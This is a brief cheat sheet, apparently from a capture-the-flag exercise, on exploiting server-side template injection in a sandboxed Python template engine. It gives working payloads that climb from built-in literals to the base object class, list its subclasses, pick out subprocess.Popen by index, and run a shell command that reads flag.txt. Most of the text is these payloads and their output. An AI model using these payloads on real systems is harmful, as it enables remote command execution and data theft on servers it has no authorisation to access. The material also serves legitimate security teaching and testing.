# SSTI

In the exploitation of an SSTI vulnerability, our goal is to recover access to the regular python execution flow by abusing objects that are non sandboxed.

1. Accessing <class 'object'>

Objects that are always accessible from the sandboxed env:

```
[]
''
()
dict
config
request

# example payload
{{ [].__class__.__base__ }} # <class 'object'>
```

2. Finding subclasses to abuse
```
{{ [].__class__.__base__.__subclasses__() }} # [<class 'type'>, <class 'weakref'>,..., <class 'subprocess.Popen'>,...]
```

The subprocess.Popen class allows us to run os commands and is of interest.
```
python3 extract_subclass_num.py subclasses subprocess
413:  <class 'subprocess.CompletedProcess'>
414:  <class 'subprocess.Popen'>
```
3. Running OS commands
```
{{ [].__class__.__base__.__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}
```
